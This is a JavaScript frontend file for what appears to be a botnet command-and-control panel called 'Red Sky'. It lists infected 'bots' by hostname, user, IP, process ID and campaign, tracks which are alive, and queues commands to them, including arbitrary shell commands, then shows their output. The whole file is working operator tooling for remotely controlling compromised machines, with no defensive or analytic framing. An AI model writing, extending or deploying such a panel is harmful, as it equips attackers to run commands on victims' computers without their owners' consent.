// language: JavaScript, file: panel.js, target: Red Sky panel frontend
// Talks to panel_backend.py over REST + WebSocket.

const API = "";
let TOKEN = "";
let CURRENT_BOT = null;
let WS = null;

// ── tiny dom helpers ──
const $ = (id) => document.getElementById(id);
const el = (tag, cls, txt) => {
  const e = document.createElement(tag);
  if (cls) e.className = cls;
  if (txt !== undefined) e.textContent = txt;
  return e;
};
const esc = (s) => String(s ?? "").replace(/[&<>"']/g, c => (
  {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]
));

function toast(msg, isErr = false) {
  const t = el("div", "toast" + (isErr ? " err" : ""), msg);
  document.body.appendChild(t);
  setTimeout(() => t.remove(), 3000);
}

function shortId(id) {
  if (!id) return "?";
  return id.split("-")[0];
}

function ago(ts) {
  const s = Math.floor(Date.now() / 1000) - ts;
  if (s < 60) return s + "s";
  if (s < 3600) return Math.floor(s / 60) + "m";
  if (s < 86400) return Math.floor(s / 3600) + "h";
  return Math.floor(s / 86400) + "d";
}

// ── API ──
async function api(path, opts = {}) {
  const headers = opts.headers || {};
  if (TOKEN) headers["X-RedSky-Token"] = TOKEN;
  if (opts.body && typeof opts.body === "object") {
    headers["Content-Type"] = "application/json";
    opts.body = JSON.stringify(opts.body);
  }
  const r = await fetch(API + path, { ...opts, headers });
  if (r.status === 401) {
    showLogin();
    throw new Error("unauthorized");
  }
  const ct = r.headers.get("content-type") || "";
  if (ct.includes("application/json")) return r.json();
  return r.text();
}

// ── auth ──
function showLogin() {
  $("login-screen").classList.add("active");
  $("panel-screen").classList.remove("active");
  if (WS) { WS.close(); WS = null; }
}

function showPanel() {
  $("login-screen").classList.remove("active");
  $("panel-screen").classList.add("active");
  connectWs();
  refreshAll();
}

async function doLogin() {
  const pass = $("login-pass").value;
  const totp = $("login-totp").value;
  $("login-error").textContent = "";
  try {
    const r = await fetch(API + "/api/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password: pass, totp: totp }),
    });
    if (!r.ok) {
      const j = await r.json().catch(() => ({}));
      $("login-error").textContent = j.detail || "login failed";
      return;
    }
    const j = await r.json();
    const tok = r.headers.get("X-RedSky-Token") || j.token || "";
    TOKEN = tok;
    sessionStorage.setItem("redsky_token", TOKEN);
    showPanel();
  } catch (e) {
    $("login-error").textContent = "network error";
  }
}

async function doLogout() {
  try { await api("/api/logout", { method: "POST" }); } catch (e) {}
  TOKEN = "";
  sessionStorage.removeItem("redsky_token");
  showLogin();
}

// ── data ──
async function refreshBots() {
  const j = await api("/api/bots");
  const list = $("bot-list");
  list.innerHTML = "";
  const now = Math.floor(Date.now() / 1000);
  for (const b of j.bots) {
    const alive = (now - b.last_seen) < 300;
    const row = el("div", "bot-row" + (alive ? " alive" : ""));
    if (CURRENT_BOT && CURRENT_BOT.id === b.id) row.classList.add("selected");

    const r1 = el("div", "row1");
    r1.appendChild(el("span", "host", b.hostname || "unknown"));
    r1.appendChild(el("span", "id", shortId(b.id)));
    row.appendChild(r1);

    const r2 = el("div", "row2");
    r2.appendChild(el("span", "user", b.user || "?"));
    r2.appendChild(el("span", "age", ago(b.last_seen) + " ago"));
    row.appendChild(r2);

    row.onclick = () => selectBot(b);
    list.appendChild(row);
  }
}

async function refreshStats() {
  const s = await api("/api/stats");
  $("stat-bots").textContent = s.bots_alive + "/" + s.bots_total;
  $("stat-queued").textContent = s.tasks_queued;
  $("stat-done").textContent = s.tasks_done;
}

async function refreshAll() {
  try {
    await refreshBots();
    await refreshStats();
    if (CURRENT_BOT) await refreshDetail(CURRENT_BOT.id);
  } catch (e) {
    if (e.message !== "unauthorized") toast("refresh failed: " + e.message, true);
  }
}

async function selectBot(b) {
  CURRENT_BOT = b;
  $("detail-empty").classList.add("hidden");
  $("detail-content").classList.remove("hidden");
  $("detail-hostname").textContent = b.hostname || "unknown";
  await refreshDetail(b.id);
  await refreshBots();
}

async function refreshDetail(botId) {
  const j = await api("/api/bots/" + botId);
  const b = j.bot;
  const tasks = j.tasks || [];

  const meta = $("detail-meta");
  meta.innerHTML = "";
  const now = Math.floor(Date.now() / 1000);
  const age = now - b.last_seen;
  const alive = age < 300;
  for (const [k, v] of [
    ["id", b.id],
    ["user", b.user || "?"],
    ["os", b.os || "?"],
    ["arch", b.arch || "?"],
    ["ip", b.ip || "?"],
    ["pid", b.pid || "?"],
    ["campaign", b.campaign || "?"],
    ["last seen", alive ? ago(b.last_seen) + " ago" : "dead (" + ago(b.last_seen) + ")"],
  ]) {
    const item = el("div", "meta-item");
    item.innerHTML = `<span class="k">${esc(k)}</span><span class="v">${esc(v)}</span>`;
    meta.appendChild(item);
  }

  const tl = $("task-list");
  tl.innerHTML = "";
  for (const t of tasks) {
    const row = el("div", "task-row " + t.status);
    row.appendChild(el("span", "task-id", shortId(t.id)));
    row.appendChild(el("span", "task-cmd", t.command));
    row.appendChild(el("span", "task-status", t.status));
    const out = (t.output || "").slice(0, 80);
    row.appendChild(el("span", "task-output", out));
    tl.appendChild(row);
  }

  const ev = $("event-list");
  ev.innerHTML = "";
  const ej = await api("/api/events?limit=40");
  for (const e of (ej.events || []).filter(x => x.bot_id === botId)) {
    const row = el("div", "event-row");
    row.appendChild(el("span", "ts", ago(e.ts) + " ago"));
    row.appendChild(el("span", "kind", e.kind));
    row.appendChild(el("span", "task-output", (e.data || "").slice(0, 120)));
    ev.appendChild(row);
  }
}

async function runCommand() {
  const input = $("cmd-input");
  const raw = input.value.trim();
  if (!raw || !CURRENT_BOT) return;

  // parse "command args_json" — default args {}
  const parts = raw.split(/\s+/);
  const cmd = parts[0];
  let args = {};
  if (parts.length > 1) {
    const rest = raw.slice(cmd.length).trim();
    try { args = JSON.parse(rest); }
    catch (e) { args = { cmd: rest }; }  // shorthand: `shell whoami` → {"cmd": "whoami"}
  }
  // convenience: if command is shell and args missing cmd, wrap
  if (cmd === "shell" && !args.cmd) args = { cmd: raw.slice(6).trim() };

  $("cmd-output").textContent = "▶ queued " + cmd + " ...\n";
  input.value = "";

  try {
    const j = await api("/api/queue", {
      method: "POST",
      body: { bot_id: CURRENT_BOT.id, command: cmd, args }
    });
    toast("queued: " + shortId(j.task_id));
    // poll for the result
    const tid = j.task_id;
    let tries = 0;
    const poll = setInterval(async () => {
      tries++;
      try {
        const t = await api("/api/tasks/" + tid);
        if (t.task && (t.task.status === "done" || t.task.status === "failed")) {
          clearInterval(poll);
          $("cmd-output").textContent += "\n" + (t.task.output || "(no output)");
        }
      } catch (e) {}
      if (tries > 60) { clearInterval(poll); $("cmd-output").textContent += "\n[timeout]"; }
    }, 1000);
  } catch (e) {
    $("cmd-output").textContent += "\n[!] " + e.message;
  }
}

// ── websocket live updates ──
function connectWs() {
  if (WS) WS.close();
  const proto = location.protocol === "https:" ? "wss:" : "ws:";
  WS = new WebSocket(`${proto}//${location.host}/ws?token=${encodeURIComponent(TOKEN)}`);
  WS.onmessage = (msg) => {
    try {
      const d = JSON.parse(msg.data);
      if (d.stats) {
        $("stat-bots").textContent = d.stats.bots_alive + "/" + d.stats.bots_total;
        $("stat-queued").textContent = d.stats.tasks_queued;
        $("stat-done").textContent = d.stats.tasks_done;
      }
      if (d.bots) {
        // lightweight refresh — update bot list without a fetch
        const list = $("bot-list");
        list.innerHTML = "";
        const now = Math.floor(Date.now() / 1000);
        for (const b of d.bots) {
          const alive = (now - b.last_seen) < 300;
          const row = el("div", "bot-row" + (alive ? " alive" : ""));
          if (CURRENT_BOT && CURRENT_BOT.id === b.id) row.classList.add("selected");
          const r1 = el("div", "row1");
          r1.appendChild(el("span", "host", b.hostname || "unknown"));
          r1.appendChild(el("span", "id", shortId(b.id)));
          row.appendChild(r1);
          const r2 = el("div", "row2");
          r2.appendChild(el("span", "user", b.user || "?"));
          r2.appendChild(el("span", "age", ago(b.last_seen) + " ago"));
          row.appendChild(r2);
          row.onclick = () => selectBot(b);
          list.appendChild(row);
        }
      }
    } catch (e) {}
  };
  WS.onclose = () => { setTimeout(() => { if (TOKEN) connectWs(); }, 3000); };
}

// ── tab switching ──
document.querySelectorAll(".tab").forEach(t => {
  t.onclick = () => {
    document.querySelectorAll(".tab").forEach(x => x.classList.remove("active"));
    document.querySelectorAll(".tab-panel").forEach(x => x.classList.remove("active"));
    t.classList.add("active");
    $("tab-" + t.dataset.tab).classList.add("active");
  };
});

// ── wire up ──
$("login-btn").onclick = doLogin;
$("login-pass").addEventListener("keydown", e => { if (e.key === "Enter") doLogin(); });
$("login-totp").addEventListener("keydown", e => { if (e.key === "Enter") doLogin(); });
$("logout-btn").onclick = doLogout;
$("refresh-btn").onclick = refreshAll;
$("cmd-run").onclick = runCommand;
$("cmd-input").addEventListener("keydown", e => { if (e.key === "Enter") runCommand(); });
$("detail-close").onclick = () => {
  CURRENT_BOT = null;
  $("detail-empty").classList.remove("hidden");
  $("detail-content").classList.add("hidden");
  refreshBots();
};

// ── boot ──
const saved = sessionStorage.getItem("redsky_token");
if (saved) {
  TOKEN = saved;
  api("/api/session").then(j => {
    if (j.authenticated) showPanel();
    else showLogin();
  }).catch(() => showLogin());
} else {
  showLogin();
}
